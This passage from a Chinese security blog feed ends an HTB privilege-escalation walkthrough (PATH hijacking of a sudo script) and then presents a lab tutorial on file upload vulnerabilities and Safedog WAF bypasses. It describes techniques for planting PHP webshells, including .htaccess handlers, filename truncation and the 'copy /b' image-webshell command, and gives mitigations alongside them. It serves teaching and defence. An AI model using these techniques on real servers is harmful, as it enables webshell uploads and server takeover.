alt="image-20230428132024695"></p><p>尝试sudo提权：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132100862.png" alt="image-20230428132100862"></p><p>可以用root权限执行&#x2F;opt&#x2F;cleanup.sh，通过crontab也发现该文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132201958.png" alt="image-20230428132201958"></p><p>查看cleanup.sh:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132227028.png" alt="image-20230428132227028"></p><p>注意最后一行，用到了find命令，但是没有使用绝对路径，因此通过路径劫持提权，步骤如下：</p><ul><li>新建一个find文件，通过find文件获取root shell</li><li>更改环境变量，使得sudo运行cleanup.sh时首先使用新建的find</li></ul><p>首先新建find文件，内容为”&#x2F;bin&#x2F;bash”:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132623018.png" alt="image-20230428132623018"></p><p>&#x2F;opt目录不可写，因此写到&#x2F;tmp目录下。</p><p>赋予执行权限：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132708609.png" alt="image-20230428132708609"></p><p>接下来更改环境变量，sudo执行：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132751987.png" alt="image-20230428132751987"></p><p>执行后依然是wizard权限，未获得root权限的shell。</p><p>重新执行<code>sudo PATH=/TMP:$PATH /opt/cleanup.sh</code>后，提权成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428133006076.png" alt="image-20230428133006076"></p><p>因为<strong>使用sudo执行一条命令时，会起一个新的shell，因此需要在sudo命令后更改环境变量！</strong></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>file_upload</title>
    <link href="/2023/04/27/file-upload/"/>
    <url>/2023/04/27/file-upload/</url>
    
    <content type="html"><![CDATA[<h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><p><img src="/2023/04/27/file-upload/19475290.jpg" alt="image-20240723152418622"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>简单来说，存在文件上传，就可能存在文件上传漏洞。上传文件时，如果未对上传的文件进行严格的验证和过滤，就可能导致传入非法文件，例如木马等等。</p><h3 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h3><p>上传漏洞与SQL注入或 XSS相比，其风险更大。</p><p>如果 Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，就会导致代码执行。如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为。如果上传的文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个webshell到服务器上完全控制系统。</p><h3 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h3><ul><li><p>fofa等引擎搜索。例如inurl:upload.php.</p></li><li><p>黑盒。使用敏感目录扫描工具查找:御剑后台扫描工具，dirsearch等等。</p></li><li><p>白盒。找对cms，看源码。</p></li><li><p>后台查找。进入后台之后并不能获得网站权限，只是后台权限，可以通过登录后台进行文件上传从而获得整个网站的权限。</p></li><li><p>会员中心，个人资料等模块查找。</p></li></ul><p>找到上传点之后，是否具有上传漏洞，具体情况需要结合抓包情况查看。</p><h3 id="upload-labs靶场介绍"><a href="#upload-labs靶场介绍" class="headerlink" title="upload-labs靶场介绍"></a>upload-labs靶场介绍</h3><p><img src="/2023/04/27/file-upload/dlabs.png" alt="image-20211025002900015"></p><p>upload-labs是一个使用php语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场。提供了文件上传的各种不同环境，用以进行原理的学习。</p><p>项目地址:<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>本文档主要介绍文件上传部分内容，靶场搭建等部分不进行详细讲解，可以参考：<a href="https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163509252516780271586181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&utm_term=uploadlabs%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163509252516780271586181&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&amp;utm_term=uploadlabs%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187</a></p><h3 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h3><ul><li>格式</li></ul><p>正常情况下，如果将php木马上传到网站，但格式为jpg格式，一般是无法成功进行利用的（无解析漏洞）。需要注意网站所使用的语言以及上传文件的格式类型。</p><ul><li>分类</li></ul><p>对于文件上传漏洞，需要注意的是清楚地把握住出现漏洞的点。例如是编辑器漏洞，还是第三方应用漏洞，或者是代码的逻辑中存在漏洞。针对不同的漏洞，应该采用更有针对性的方法。在下文会对不同的分类具体展开。</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h4 id="js类防护"><a href="#js类防护" class="headerlink" title="js类防护"></a>js类防护</h4><p><strong>Pass-01</strong></p><ul><li>靶场环境中，可以直接删除js过滤代码</li><li>真实环境中可以考虑浏览器禁用js（可能会导致正常功能无法使用，不推荐）</li></ul><p>浏览器禁用javascript方法（Firefox为例）：</p><p>搜索栏中输入about:config，确定之后搜索javascript.enabled,点击切换即可禁用js脚本</p><p><img src="/2023/04/27/file-upload/ox.png" alt="image-20211025135825125"></p><p>Tips:有时候上传文件使用burp抓包无法捕获到流量，可能就是因为采用了本地js的验证方法。</p><p><strong>防护措施</strong></p><p>尽量使用后端验证</p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>文件上传的后端验证主要有后缀名，文件类型和文件头等等。其中后缀名主要使用黑白名单进行验证，文件类型主要通过MIME信息验证，而文件头一般通过内容头进行校验。</p><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是指只要后缀名不在给定的数组中，就不会被拦截，可以进行上传。常见的黑名单有asp,php,jsp,aspx,cgi,war等等。一般可以通过如下几种方式绕过：</p><h5 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h5><p><strong>Pass-03</strong></p><p>首先查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025145816144"></p><p>典型的黑名单过滤，上传php文件，上传失败：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025144503909"></p><p>以最常用的php为例，如果黑名单中只有.php后缀，可以通过php3,php5,phtml等未被过滤的后缀名进行绕过，上传.php5进行测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025150600496"></p><p>上传成功。</p><p>对于该绕过方法，在Apache服务器中，可以通过更改Apache httpd.conf配置文件，添加.php3 和.phtml，并且取消注释，来实现对php3,phtml等文件的解析。</p><p><img src="/2023/04/27/file-upload/e.png" alt="image-20211025150142567"></p><p><strong>防护措施</strong></p><p>拓展黑名单的内容，并且对服务器配置进行严格限制，即使文件上传也无法解析</p><h5 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h5><p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>Tips:只有Apache才可以</p><p><strong>Pass-04</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025163819926"></p><p>可以看出，这里也是使用了黑名单的方式进行过滤。但是.htaccess并不在黑名单中，因此首先上传.htaccess文件：</p><p><img src="/2023/04/27/file-upload/ess.png" alt="image-20211025152331749"></p><p>这里.htaccess文件的意义是将后续上传的文件，当作php来进行解析。</p><p>Tips:</p><ul><li>如果上传的内容如上图所示，那么后续上传的文件名或后缀名中需要包含有info，也就是双引号中的值。</li><li>如果文件的内容为<code>setHandler application/x-httpd-php</code>，那么，任意形式的文件都会被当作php解析。</li><li>文件名后缀命名时记得绕开黑名单中的后缀名。</li><li>上传的.htaccess文件，通过记事本可能无法保存，可以通过burp修改文件名或者使用Notepad++保存文件。</li></ul><p>接下来对上传的info.abc进行测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025164521803"></p><p>上传成功，查看phpinfo:</p><p><img src="/2023/04/27/file-upload/info.png" alt="image-20211025164609493"></p><p>成功解析成php文件。</p><p><strong>防护措施</strong></p><p>禁止上传.htaccess文件，可以通过snort对filename的内容进行检测</p><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>Pass-05</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025164929968"></p><p>使用黑名单进行过滤，这里直接使用大小写绕过：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025165114713"></p><p>成功上传php文件。</p><p><strong>防护措施</strong></p><p>拓展黑名单内容</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p><strong>Pass-06</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025165335192"></p><p>发现这里没有使用trim()函数，也就是没有对空格进行过滤。因此尝试使用空格绕过：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025165548554"></p><p>使用burp在filename内容最后加上空格，绕过黑名单验证，成功上传。</p><p>Tips:</p><ul><li>必须抓包后在最后添加空格，如果直接在本地文件后缀加空格会被自动删除。</li><li>抓包添加空格之后，会绕过黑名单的验证，但是保存到服务器之后，文件最后的空格还是会被删除，最终还是php文件。</li></ul><p><strong>防护措施</strong></p><p>拓展黑名单，或者使用函数删除文件名末尾的空格再进行过滤。</p><p>也可写规则对空格0d0a进行匹配。</p><h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p><strong>Pass-07</strong></p><p>源码如下：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025170004591"></p><p>这里少了deldot()函数，即删除文件名末尾的点。</p><p>这里思路和空格绕过相同，但是同样需要注意只能通过抓包修改，直接在本地修改会默认删除最后的点，抓包添加点之后会绕过黑名单，但是保存到服务器之后同样最后的点会被删除，还是原来的文件格式：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025170344273"></p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025170445942"></p><p>到上传目录查看，还是原理的php格式，并能成功解析。</p><p><strong>防护措施</strong></p><p>使用函数先删除文件名末尾的.再进行过滤。</p><p>写规则对点0d0a进行匹配。</p><h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p><strong>Pass-08</strong></p><p>审计源码发现，没有使用stri_replace函数替换字符串::$DATA。</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025170728809"></p><p>在windows下，如果文件名+”::$DATA”，系统会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。例如:phpinfo.php::$DATA，Windows会自动去掉末尾的::$DATA变成phpinfo.php。利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025170934067"></p><p>上传成功。</p><p><strong>防护措施</strong></p><p>先删除文件名末尾的::$DATA再过滤操作</p><p>对filename中的::$DATA进行匹配（已经添加规则）</p><h5 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a>点加空格加点绕过</h5><p><strong>Pass-09</strong></p><p>审计源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025171317917"></p><p>这里首先会去除空格，接着删除文件名末尾的点，最后再去空。</p><p>因为最后会去空，因此文件名结尾不能为空格，可以结合点绕过进行考虑。文件名末尾为点，删除空格就加上空格，开始还会删除一个点，因此再加上点，也就是<code>. .</code>，测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025172046926"></p><p>成功绕过过滤，上传文件。</p><p><strong>防护措施</strong></p><p>删除文件名末尾的点，空格再过滤</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>Pass-10</strong></p><p>源码：</p><p><img src="/2023/04/27/file-upload/0code.png" alt="image-20211025172233670"></p><p>这里直接上传文件，成功：</p><p><img src="/2023/04/27/file-upload/0t.png" alt="image-20211025172429960"></p><p>到对应目录下查看，发现文件为：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025172515208"></p><p>文件格式不对是无法进行解析的。本关中过滤思路为直接删除黑名单中的后缀名，因此双写进行绕过：</p><p><img src="/2023/04/27/file-upload/0s.png" alt="image-20211025172629452"></p><p>文件格式为php，可以正常解析。</p><p><strong>防护措施</strong></p><p>对文件名的过滤使用循环过滤来替代单次过滤</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是指只有后缀名在给定的数组中，才不会被拦截，可以进行上传。较黑名单而言，白名单验证往往更为安全。但是也有如下几类绕过方式：</p><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p><strong>Pass-02</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025143831680"></p><p>先简单介绍一下$FILES函数：<br>$_FILES[myFile] [name]:客户端文件的原名称</p><p>$_FILES[myFile] [type]:文件的MIME类型</p><p>$_FILES[myFile] [size]:上传文件的大小，单位为字节</p><p>$_FILES[myFile] [tmp_name]:文件被上传后在服务端存储的临时文件名</p><p>$_FILES[myFile] [error]:和该文件上传相关的错误代码</p><p>通过源码可以发现，这里通过对MIME类型的验证进行过滤。上传文件测试：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025144503909"></p><p>上传失败，抓包查看：</p><p><img src="/2023/04/27/file-upload/p.png" alt="image-20211025144604979"></p><p>对content-type内容进行修改：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025144748487"></p><p>上传成功。</p><p>因此，单纯通过对MIME类型进行验证是很不安全的。</p><p><strong>防护措施</strong></p><p>对MIME,后缀名进行匹配验证。</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p><strong>Pass-11</strong></p><p>这里的%00截断需要与后面的00截断区分开。%00截断主要使用在地址中。</p><p>首先查看源码：</p><p><img src="/2023/04/27/file-upload/1code.png" alt="image-20211025175804899"></p><p>非常典型的白名单过滤。首先抓包：</p><p><img src="/2023/04/27/file-upload/1f.png" alt="image-20211025175934766"></p><p>这里发现url中带有参数save_path.结合源码发现，本关的文件，上传之后，保存到file_upload_path中，而file_upload_path由save_path,随机数和日期拼接而成。例如save_path为..&#x2F;upload，那么保存的路径就是..&#x2F;upload&#x2F;6620211025.jpg（jpg是上传的文件的后缀）。此处利用%00对后续内容进行截断，例如save_path为..&#x2F;upload&#x2F;a.php%00，正常来说保存路径应该是..&#x2F;upload&#x2F;a.php%006620211025.jpg，但是%00会将后面的随机数及日期部分丢弃，直接保存为a.php，测试：</p><p><img src="/2023/04/27/file-upload/1s.png" alt="image-20211025180435295"></p><p>上传成功。</p><p>Tips:此处的文件名后缀，一定要在白名单中，不然会被拦截，即使后缀为jpg，但是截断时保存为php，依然能够被解析：</p><p><img src="/2023/04/27/file-upload/1info.png" alt="image-20211025180635064"></p><p><strong>防护措施</strong></p><p>对url中的00进行匹配（已添加规则）</p><h5 id="00截断-1"><a href="#00截断-1" class="headerlink" title="00截断"></a>00截断</h5><p><strong>Pass-12</strong></p><p>源码：</p><p><img src="/2023/04/27/file-upload/2code.png" alt="image-20211025205040477"></p><p>这里的提交方式由get变成了post，同样修改save_path参数的值。</p><p>注意：00截断与前文的%00截断的区别在于，%00截断主要用于地址，例如上一关所示的文件上传地址，并且get方法会自动解码%00，因此直接输入%00即可，但是post方法不会，因此需要先将其编码才能实现截断的效果。</p><p><img src="/2023/04/27/file-upload/2en.png" alt="image-20211025211523737"></p><p>上传的文件名后缀为白名单中的jpg，MIME格式无需修改，将save_path加上hahaha.php%00，再使用编码功能对%00进行编码，最后发送数据包，上传成功：</p><p><img src="/2023/04/27/file-upload/2s.png" alt="image-20211025211121816"></p><p>文件名为我们修改的hahaha.php，并能成功解析：</p><p><img src="/2023/04/27/file-upload/2info.png" alt="image-20211025211716502"></p><p><strong>防护措施</strong></p><p>对post参数的内容进行00匹配</p><h4 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h4><h5 id="上传图片马配合文件包含漏洞"><a href="#上传图片马配合文件包含漏洞" class="headerlink" title="上传图片马配合文件包含漏洞"></a>上传图片马配合文件包含漏洞</h5><p>上传图片马可以用来突破getimagesize，exif_imagetype等函数，就不一一举例，原理和方法都相同，接下来以Pass-13进行说明。</p><p><strong>Pass-13</strong></p><p>图片马是指将木马插入到图片中，并且不影响图片的正常显示。</p><p>图片马的制作一般有如下几种方法：</p><ul><li>以文本方式打开图片</li></ul><p>在文件末尾直接写一句话木马。</p><ul><li>使用cmd制作木马</li></ul><p>copy aaa.jpg &#x2F;b + trojan.php &#x2F;a webshell.jpg。其中&#x2F;b是二进制形式打开，&#x2F;a是ascii方式打开，webshell.jpg是生成的图片马。这里最好把图片文件放在前面，如果反过来，不会影响效果，但是会让木马脚本出现在文件的开头，更容易被检测到。</p><ul><li>16进制打开图片插入木马</li></ul><p>使用winhex等工具打开， 在文件尾插入一句话木马。</p><ul><li>使用PS</li></ul><p>打开文件-&gt;文件简介，在标题处写入木马：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211025214635884"></p><p>这里就使用cmd制作木马，生成webshell.jpg，上传成功：</p><p><img src="/2023/04/27/file-upload/3up.png" alt="image-20211025214745607"></p><p>接下来结合文件包含漏洞，执行php代码。</p><p>右键图片复制地址，并打开文件包含漏洞页面，将地址传给file参数，成功以jpg格式执行phpinfo():</p><p><img src="/2023/04/27/file-upload/3s.png" alt="image-20211025214919172"></p><p><strong>防护措施</strong></p><p>在文件内容中搜索特征字符串例如&lt;?php等，对其进行匹配</p><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p><strong>Pass-17</strong></p><p>源码如下 ：</p><p><img src="/2023/04/27/file-upload/7code.png" alt="image-20211025220038872"></p><p>为了将用户提交的图片进行尺寸上的更改或者适应某些内容，有时会进行二次渲染。</p><p>审计这里的代码，可以发现存在逻辑问题。首先没有进行验证，就将文件直接上传，随后将temp_file移动到upload_file，再将upload_file重命名为file_upload_path. 但是其实在开始，文件已经成功上传到了服务器，只是被重命名了无法发现，接下来进行测试：</p><p><img src="/2023/04/27/file-upload/7rename.png" alt="image-20211025221931927"></p><p>将rename直接注释掉，上传文件：</p><p><img src="/2023/04/27/file-upload/ell.png" alt="image-20211025222114342"></p><p>可以发现文件已经被上传到了服务器。结合条件竞争的利用在下面具体讲解。</p><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><p>还是以17关为例。上面已知，代码中先移动文件，再进行过滤，因此只需要在文件被移动之前，通过与rename进行”竞争”，并将其”占有”，就可以进行利用。</p><p>这里使用burp进行爆破来实现不断发包的目的：</p><p><img src="/2023/04/27/file-upload/7brute.png" alt="image-20211025224348276"></p><p>重复发包10000次，并且不断刷新页面访问文件上传保存到的临时地址，也就是upload&#x2F;abcd.php。</p><p>会出现如下两种情况：</p><p><img src="/2023/04/27/file-upload/7su.png" alt="image-20211025223249026"></p><p><img src="/2023/04/27/file-upload/7fa.png" alt="image-20211025223310146"></p><p>如果为not found，就是文件已经被重命名，如果是warning或者直接解析出phpinfo()的内容就是”竞争”成功，避免了将php格式重命名为jpg等格式，可以执行所写的php脚本，连接一句话木马等等。</p><p>条件竞争典型：phpcms</p><p><strong>防护措施</strong></p><p>优化过滤的代码逻辑，先过滤再上传。</p><h5 id="文件夹绕过"><a href="#文件夹绕过" class="headerlink" title="文件夹绕过"></a>文件夹绕过</h5><p><strong>Pass-19</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/9code.png" alt="image-20211025225857102"></p><p>这里将上传的文件移动到file_upload_path,file_upload_path为upload&#x2F;拼接上file_name，而file_name就是我们用post提交的save_name的值。</p><p>这里用到新的思路，首先查看UI界面：</p><p><img src="/2023/04/27/file-upload/9ui.png" alt="image-20211025230304838"></p><p>这里我们可以决定保存的名称，抓包：</p><p><img src="/2023/04/27/file-upload/9s.png" alt="image-20211025230502806"></p><p>这里保存的名字为upload-19.php&#x2F;. 看似是文件夹的命名习惯，但是和上文的点绕过&#x2F;空格绕过类似，&#x2F;.结尾时，可以绕过黑名单过滤，不会被黑名单中的后缀所命中，成功上传后，服务器又会将&#x2F;.删除，保存为原来的格式，进行验证：</p><p><img src="/2023/04/27/file-upload/9info.png" alt="image-20211025230651515"></p><p>成功绕过并能够正常解析。</p><p><strong>防护措施</strong></p><p>与空格绕过点绕过类似，可以删除文件名中的&#x2F;，也可以对filename中的&#x2F;进行匹配</p><p><strong>上文讲过的哪一种思路也能进行绕过</strong></p><h5 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h5><p><strong>Pass-20</strong></p><p>结合了MIME过滤，后缀名过滤，采用白名单的方式，绕过方法为逻辑数组绕过，因为在真实环境中的实用性很小，不作讲解。</p><h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>编辑器是软体程序，一般是指用来修改电脑档案的编写软件。常见的编辑器有文本编辑器、网页编辑器、源程序编辑器、图像编辑器，声音编辑器和视频编辑器等。</p><h3 id="常见编辑器"><a href="#常见编辑器" class="headerlink" title="常见编辑器"></a>常见编辑器</h3><ul><li>FCKeditor</li><li>UEditor</li><li>eWebEditor</li><li>Cute Editor</li><li>Webhtmleditor</li><li>Kindeditor</li><li>Freetextbox</li><li>Msn editor</li></ul><h3 id="识别编辑器"><a href="#识别编辑器" class="headerlink" title="识别编辑器"></a>识别编辑器</h3><ul><li><p>inurl:fckeditor</p></li><li><p>后台看</p></li><li><p>目录扫描</p></li></ul><h3 id="编辑器漏洞利用"><a href="#编辑器漏洞利用" class="headerlink" title="编辑器漏洞利用"></a>编辑器漏洞利用</h3><p>编辑器产生的漏洞一般都是文件上传漏洞，一般没有普适性的绕过方法等，利用方法和CMS漏洞类似，需要根据已知的编辑器版本信息进行查找，如果有漏洞，就能进行利用，因此不作演示。</p><h2 id="WAF绕过（有文件上传漏洞的前提下）"><a href="#WAF绕过（有文件上传漏洞的前提下）" class="headerlink" title="WAF绕过（有文件上传漏洞的前提下）"></a>WAF绕过（有文件上传漏洞的前提下）</h2><p>目前主流的WAF大概有safedog，宝塔，D盾等等，safedog相对比较容易绕过，本次以safedog为例进行演示。实验环境为win10系统+phpstudy(Apache2.2)+safedog(Apache版)，实验的靶场为upload-labs。</p><p>WAF的绕过思路大概有两种：</p><p>1.躲过WAF的检测</p><p>2.上传其他后缀名，但是同样执行脚本内容</p><p>方法有如下几种：</p><ul><li>数据溢出-防匹配（xxx…）</li><li>符号变异-防匹配（’ “ ;）</li><li>数据截断-防匹配（%00，换行）</li><li>重复数据-防匹配（多次参数）</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>首先对pass-05再次进行测试。</p><p><img src="/2023/04/27/file-upload/5test.jpg" alt="image-20211104092359806"></p><p>直接上传php失败，接下来测试没有安全狗的情况下可以绕过的方法：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104092514190"></p><p>大小写被安全狗拦截，接着尝试通过数据溢出来绕过安全狗。</p><p>一般情况下name属性无法进行更改，因此首先想到在filename处进行溢出。</p><p><img src="/2023/04/27/file-upload/1.jpg" alt="image-20211104093032823"></p><p>失败，被拦截，尝试更多溢出：</p><p><img src="/2023/04/27/file-upload/2.jpg" alt="image-20211104093453518"></p><p>直接没有返回，失败。经过测试，如果继续加大溢出的字符，会导致apache服务直接崩溃。</p><p>Tips:这里在filename中进行溢出尝试时候，pass-06成功上传了php文件：</p><p><img src="/2023/04/27/file-upload/61.jpg" alt="image-20211104101741140"></p><p>因此，针对不同的过滤方法，就数据溢出形式的绕过而言，对filename进行溢出可能是一种可行的方法。</p><p>接着尝试在两个属性之间溢出：</p><p><img src="/2023/04/27/file-upload/3.jpg" alt="image-20211104094059729"></p><p>可以绕过安全狗，但是无法上传，提示上传出错。</p><p>接下来模仿报文的格式，在溢出的数据后加”;” :</p><p><img src="/2023/04/27/file-upload/62.jpg" alt="image-20211104101947942"></p><p>可以成功绕过安全狗限制。</p><p>Tips:如果溢出的数据不够，可能还会被拦截，加大溢出数据的长度即可。经过测试，不止在name,filename处可以成功，其他属性直接插入垃圾数据并使用”;”分隔也有同样的效果。</p><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><p>首先对正常php进行测试，被安全狗拦截：</p><p><img src="/2023/04/27/file-upload/21.jpg" alt="image-20211104124300312"></p><p>符号变异的绕过主要就是通过对<code>&#39; &quot; ;   </code>等符号进行测试。接下来依次尝试：</p><p>从报文可以看出，filename到content-type中间没有分号，而是一个换行，尝试添加分号：</p><p><img src="/2023/04/27/file-upload/22.jpg" alt="image-20211104124615589"></p><p>绕过失败，被拦截。</p><p>尝试删除一个后面的引号：</p><p><img src="/2023/04/27/file-upload/23.jpg" alt="test023"></p><p>成功绕过安全狗上传文件,到目录下查看，正常：</p><p><img src="/2023/04/27/file-upload/r1.jpg" alt="image-20211104125154265"></p><p>尝试删除前面的引号：</p><p><img src="/2023/04/27/file-upload/24.jpg" alt="image-20211104125241961"></p><p>被拦截。这里引号的位置不同，导致拦截行为有差异，可能跟安全狗的安全策略有关。</p><p>接下来考虑用单引号替换双引号，测试方法相同就不再重复。结果如下：</p><p><img src="/2023/04/27/file-upload/ell.jpg" alt="image-20211104125535150"></p><p>如果没有单引号、只有一个单引号或者有一个闭合的单引号，全部都能绕过检测成功上传文件。</p><p>Tips:上述单引号的四种绕过中，第二种会上传后缀名为php’的文件，无法执行</p><p>另外可以尝试filename&#x3D;”x”a.php。有一定几率绕过，上传的文件名为a.php。如果直接写”x”.php，则文件名为.php,也能执行。</p><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><p>尝试之前试过的00截断，在post中，因此需要进行url编码：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211104132010892"></p><p>直接绕过了安全狗。查看服务器中的文件，为a.php:</p><p><img src="/2023/04/27/file-upload/r2.jpg" alt="image-20211104132106720"></p><p>接着通过分号进行截断，这里主要是利用了白名单，让检测时误以为是白名单中的内容：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104132231286"></p><p>成功绕过安全狗，注意，虽然有.jpg ; 但是文件最终还是php文件。</p><p>Tips:利用数据截断进行上传时，还可以考虑::$DATA截断，换行截断。</p><p>换行截断是指：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211104135213671"></p><p>也有一定的几率能够绕过。</p><h3 id="重复数据-防匹配"><a href="#重复数据-防匹配" class="headerlink" title="重复数据-防匹配"></a>重复数据-防匹配</h3><p>这里通过使用重复数据进行绕过，上传的最终文件是最后一个，因此前面重复添加jpg来绕过：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104133636071"></p><p>成功，到服务器进行验证：</p><p><img src="/2023/04/27/file-upload/a.jpg" alt="image-20211104133806292"></p><p>上传了名为hahaha.php的文件。</p><p>尝试在filename中加入重复数据：</p><p><img src="/2023/04/27/file-upload/aa.jpg" alt="image-20211104134353518"></p><p>这里将name，content-type的内容添加到filename中，绕过了安全狗，查看上传的文件名：</p><p><img src="/2023/04/27/file-upload/nt.jpg" alt="image-20211104134444896"></p><p>发现文件名闻jpegaaaaa.php，观察报文发现新的思路，是否可以直接使用&#x2F;绕过？</p><p>进行测试：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20211104134940506"></p><p>发现被过滤，将aaa替换成更长的字符串依然失败。再结合报文，可能需要引号闭合，进行测试：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104134902898"></p><p>成功绕过，查看服务器中的文件名：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20211104135052079"></p><p>与猜想的一致，成功。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>在不了解黑白名单内容的情况下，可以通过fuzz测试来进行尝试。</p><p>还是以upload-labs为例，假设只针对php文件。</p><p>对filename的内容进行爆破，使用fuzz字典，结果如下：</p><p><img src="/2023/04/27/file-upload/r.jpg" alt="image-20211104135715164"></p><p>是否能通过检测可以通过render查看，此处直接从服务器上更直观地来看：</p><p><img src="/2023/04/27/file-upload/r4.jpg" 